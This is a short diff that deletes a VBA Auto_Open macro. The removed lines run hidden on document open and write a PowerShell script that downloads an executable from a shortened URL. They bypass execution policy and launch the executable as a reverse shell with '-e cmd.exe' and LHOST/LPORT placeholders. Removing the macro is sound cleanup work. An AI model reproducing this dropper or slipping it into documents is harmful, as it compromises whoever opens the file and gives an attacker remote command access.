@@ -1,5 +1,0 @@
-Private Sub Auto_Open()
-
-  Shell ("C:\\Windows\\System32\\cmd.exe /c echo (wget 'https://tinyurl.com/y88r9epk' -OutFile a.exe) > b.ps1 & powershell -ExecutionPolicy ByPass -File b.ps1 & START /MIN a.exe LHOST LPORT -e cmd.exe -d & exit"), vbHidden
-
-End Sub
